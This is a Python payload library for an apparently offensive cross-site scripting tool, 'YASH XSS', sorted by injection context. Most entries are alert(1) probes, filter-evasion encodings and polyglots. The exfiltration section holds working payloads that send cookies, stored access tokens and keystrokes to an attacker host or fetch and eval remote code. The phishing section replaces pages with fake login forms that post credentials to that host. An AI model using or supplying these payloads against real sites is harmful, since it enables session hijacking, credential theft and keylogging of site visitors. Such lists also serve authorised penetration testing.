"""
YASH XSS — Unified Master Payload Library
=========================================
This file consolidates all reflected, stored, DOM-based, and high-impact 
exfiltration payloads into one structure.
"""

# ── High-Impact Functional Payloads ──────────────────────────────────────────
EXFILTRATION = [
    "<script>document.location='http://{LHOST}/grabber.php?c='+document.cookie</script>",
    "<script>fetch('https://{BURP_ID}.burpcollaborator.net',{{method:'POST',mode:'no-cors',body:document.cookie}});</script>",
    "<img src=x onerror='new Image().src=\"http://{LHOST}/log.php?c=\"+document.cookie;'>",
    "<svg/onload='fetch(\"//{LHOST}/a\").then(r=>r.text().then(t=>eval(t)))'>",
    "<script>fetch('http://{LHOST}/log?token='+localStorage.getItem('access_token'));</script>",
    "<script>document.onkeypress=function(e){{fetch('http://{LHOST}/k?key='+String.fromCharCode(e.which))}};</script>",
    "<script>navigator.sendBeacon('http://{LHOST}/log', document.cookie);</script>",
    "<script>var ws=new WebSocket('ws://{LHOST}');ws.onopen=()=>ws.send(document.cookie)</script>",
    "<script>new Image().src='http://{LHOST}/cookie.php?c='+localStorage.getItem('access_token');</script>"
]

PHISHING_UI = [
    "<script>history.replaceState(null,null,'/login');document.body.innerHTML='<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;text-align:center;\"><br><br><h1>Session Expired</h1><p>Please login to continue</p><form action=\"http://{LHOST}/login\" method=\"POST\">Username: <input name=\"u\"><br>Password: <input name=\"p\" type=\"password\"><br><input type=\"submit\"></form></div>'</script>",
    "<script>history.replaceState(null, null, '../../../login');document.body.innerHTML = '</br></br><h1>Please login to continue</h1><form>Username: <input type=\"text\">Password: <input type=\"password\"></form><input value=\"submit\" type=\"submit\">'</script>",
    "<details open ontoggle=\"document.body.innerHTML='<h1>Under Maintenance</h1>'\">"
]

# ── Context-Specific Payloads ────────────────────────────────────────────────
BODY = [
    "<script>alert(document.domain)</script>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<details/open/ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>XSS</marquee>",
    "<iframe src=javascript:alert(1)></iframe>",
    "<object data=\"javascript:alert(1)\">",
    "<svg><animatetransform onbegin=alert(1)>",
    "<video><source onerror=\"alert(1)\">",
    "<audio src onloadstart=alert(1)>",
    "<body onload=alert(1)>",
    "<scr<script>ipt>alert(1)</scr<script>ipt>",
    "<object/data=\"jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;1&#x29;\">",
    "<input autofocus onfocus=alert(1)>",
    "<math><mtext></table></math><img src=x onerror=alert(1)>",
    '"><svg onload=alert(1)>'
]

ATTRIBUTE = [
    "\" onmouseover=alert(1) \"",
    "\" autofocus onfocus=alert(1) \"",
    "\" onclick=alert(1) \"",
    "\" onpointerenter=alert(1) \"",
    "\" formaction=javascript:alert(1) type=submit \"",
    "\" oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto \"",
    "\"><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "' onfocus=alert(1) autofocus '",
    "javascript:alert(1)",
    "' onmouseover='alert(1)",
    '" onerror="alert(1)',
    '" onload="alert(1)'
]

SCRIPT = [
    "';alert(document.cookie);//",
    "\";alert(document.cookie);//",
    "'-alert(1)-'",
    "\\`;alert(1);//",
    "</script><script>alert(1)</script>",
    "window['alert'](1)",
    "'-alert(document.domain)-'",
    "<script>1?alert(1):confirm(1)</script>",
    "<script>alert/**/(/**/1/**/)</script>",
    '"`+alert(1)+`"',
    "'+alert(1)+'",
    '\\";alert(1)//',
    "</script><svg onload=alert(1)>"
]

# ── WAF & Advanced Evasion ───────────────────────────────────────────────────
WAF_EVASION = [
    "<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>",
    "eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))",
    "java%0ascript:alert(1)",
    "<svg><script href=data:,alert(1) />",
    "<details/open/ontoggle=\"alert`1`\">",
    "8680439..toString(30)(983801..toString(36))",
    "<img src=x onerror=\"&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000049&#0000041\">",
    "<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>",
    "<img src=x onerror=\"String.fromCodePoint(97,108,101,114,116,40,49,41).replace(/.+/,eval)\">",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>alert(1)//<</script>",
    "<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>",
    "<img src=x onerror=&#97;lert(1)>"
]

# ── Specialized Categories ───────────────────────────────────────────────────
POLYGLOTS = [
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/` /+/onmouseover='1'+/[*/[]/+alert(1)//'>",
    "jaVasCript:/*-/*`/*\\\"/*\\'/*\"/*\\'/*`/*--></noscript></title></style></textarea></script></template></noembed></select>#><svg/onload=/*/alert(1)//>",
    "\"';--></title></style></textarea></script></xmp><svg/onload='+/` /+/onmouseover='1'+/[*/[]/+alert(1)//'>"
]

CSS_STYLE = [
    "<div style=\"width: expression(alert(1));\">",
    "<style>@keyframes x{{}} div{{animation:x 1s}} div:after{{content:url(\"javascript:alert(1)\")}}</style><div></div>",
    "<div style=\"background-image: url(&quot;javascript:alert(1)&quot;); shadow: 10px;\">",
    "<link rel=\"stylesheet\" href=\"javascript:alert(1);\">",
    "<style>html {{ font-family: \"';alert(1);'\"}} </style>"
]

ADVANCED_INTERACTION = [
    "<div contenteditable oncopy=\"alert(1)\">Copy this text</div>",
    "<div contenteditable onpaste=\"alert(1)\">Paste here</div>",
    "<input onsearch=\"alert(1)\" type=\"search\">",
    "<input oninvalid=\"alert(1)\" required><input type=\"submit\">",
    "<div onwheel=\"alert(1)\">Scroll over me</div>",
    "<body onauxclick=\"alert(1)\">Right-click or middle-click anywhere</body>",
    "<input accesskey=\"X\" onclick=\"alert(1)\">"
]

# ── Master Dictionary for Engine ─────────────────────────────────────────────
# This dictionary contains 100% of the payloads provided in both sources.
PAYLOADS = {
    "exfiltration": EXFILTRATION,
    "phishing_ui": PHISHING_UI,
    "body": BODY + WAF_EVASION + POLYGLOTS,
    "attribute": ATTRIBUTE,
    "script": SCRIPT,
    "html_tags": [
        "<a href=\"javascript:alert(1)\">Click Me</a>",
        "<embed src=\"javascript:alert(1)\"></embed>",
        "<form action=\"javascript:alert(1)\"><input type=submit>",
        "<button formaction=\"javascript:alert(1)\">Test</button>",
        "<input type=\"image\" src=\"x\" onerror=\"alert(1)\">",
        "<keygen autofocus onfocus=alert(1)>",
        "<frameset onload=alert(1)>",
        "<animate onbegin=alert(1) attributeName=x>"
    ],
    "advanced_interaction": ADVANCED_INTERACTION,
    "css_style": CSS_STYLE,
    "polyglots": POLYGLOTS,
    "protocol_meta": [
        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
        "<base href=\"javascript:alert(1)//\">",
        "<embed src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjwvc3ZnPg==\">",
        "data:text/html,<script>alert(1)</script>"
    ],
    "waf_evasion": WAF_EVASION,
    "dom_based": [
        "javascript:alert(document.domain)",
        '#"><img src=x onerror=alert(1)>',
        "data:text/html,<script>alert(1)</script>"
    ],
    "generic": [
        '<script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '<svg/onload=alert(1)>',
        '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;',
        '<details open ontoggle=alert(1)>',
        '"><svg onload=alert(1)>',
        "'><img src=x onerror=alert(1)>"
    ]
}

# ── Compatibility Exports (required by yash_xss_gui.py) ─────────────────────
# Maps the new payload structure to the context keys the engine uses.
CONTEXT_PAYLOAD_MAP = {
    "html_body":             PAYLOADS["body"] + PAYLOADS["html_tags"] + PAYLOADS["polyglots"] + PAYLOADS["exfiltration"] + PAYLOADS["phishing_ui"],
    "html_attribute_quoted": PAYLOADS["attribute"],
    "javascript_string":     PAYLOADS["script"],
    "javascript_var":        [';alert(1)//', '1;alert(1)', 'alert(1)', "eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))"],
    "no_reflection":         [],
}

GENERIC_PAYLOADS = PAYLOADS["generic"] + PAYLOADS["waf_evasion"] + PAYLOADS["dom_based"]